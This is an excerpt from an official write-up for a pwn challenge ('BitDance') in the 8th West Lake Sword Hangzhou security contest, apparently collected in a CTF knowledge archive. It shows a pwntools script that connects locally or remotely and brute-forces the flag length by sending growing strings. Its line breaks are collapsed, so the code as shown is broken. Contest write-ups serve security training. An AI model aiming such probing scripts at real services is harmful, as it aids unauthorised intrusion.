# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write_Up（下）.md
# TITLE: 第八届西湖论剑·中国杭州网络安全技能大赛初赛官方Write Up（下）
# CATEGORY: pwn

s = lambda data :sh.send(data)sa = lambda delim,data :sh.sendafter(delim, data)sl = lambda data :sh.sendline(data)sla = lambda delim,data :sh.sendlineafter(delim, data)r = lambda num=4096 :sh.recv(num)rl = lambda keepends=False :sh.recvline(keepends)ru = lambda delims, drop=True :sh.recvuntil(delims, drop)ra = lambda :sh.recvall()sd = lambda data :sh.shutdown(data)ia = lambda :sh.interactive()uu32 = lambda data :
u32(data.ljust(4,''))uu64 = lambda data :
u64(data.ljust(8,''))leak = lambda name,addr :
log.success('{} = {:#x}'.format(name, addr))
def dbg(a=''): gdb.attach(sh, a) pause()
binary = './BitDance'libc_path = './libc.so.6' # '/lib/i386-linux-gnu/libc.so.6' / '/lib/x86_64-linux-gnu/libc.so.6'elf = ELF(binary, checksec=False)
    #context.log_level = 'DEBUG'#context.arch = 'amd64'
def pwn(addr, debug):
global shglobal libc
 libc = elf.libc#libc = ELF(libc_path)

 i = 1while True:if(debug == 1): sh = process(binary)#sh = process(binary,env={"LD_PRELOAD" : libc_path})else: ip = addr.split(':')[0] port = addr.split(':')[1] sh = remote(ip, port)
 ru('Welcome to dance: ') sl('a'*i) data = rl()if data.startswith('Wrong length'): sh.close() i += 1continue print('flag length: ' + str(i))break
if __name__ == "__main__": pwn('localhost:
9999', 0)```
